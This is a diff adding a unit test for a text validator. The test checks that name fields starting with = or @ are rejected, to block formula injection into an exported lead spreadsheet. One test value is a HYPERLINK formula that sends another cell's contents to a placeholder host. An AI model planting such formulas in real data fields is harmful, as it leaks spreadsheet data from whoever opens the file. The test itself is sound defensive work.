@@ -112,6 +112,23 @@ describe('validateText', () => {
     expect(validateText('Jan\u0085', firstName)).toEqual({ ok: false, code: 'text_invalid' });
   });
 
+  it('rejects a leading = or @ (a formula in the lead sheet), but not + or - or later ones', () => {
+    for (const value of [
+      '=HYPERLINK("https://x.example/?"&C2,"Klik")',
+      '  =1+1',
+      '@SUM(A1)',
+      '\t=cmd',
+      '\r@x',
+    ]) {
+      expect(validateText(value, firstName), value).toEqual({ ok: false, code: 'text_invalid' });
+    }
+    // Tab and CR are trimmed off before the check, like any leading whitespace.
+    expect(validateText('\tJan', firstName)).toEqual({ ok: true, value: 'Jan' });
+    for (const value of ['Jan=Piet', 'jan@home', '-Jan', '+Jan', "D'Hondt"]) {
+      expect(validateText(value, firstName).ok, value).toBe(true);
+    }
+  });
+
   it('limits the length (default and per field)', () => {
     expect(validateText('a'.repeat(TEXT_MAX_LENGTH), firstName).ok).toBe(true);
     expect(validateText('a'.repeat(TEXT_MAX_LENGTH + 1), firstName)).toEqual({
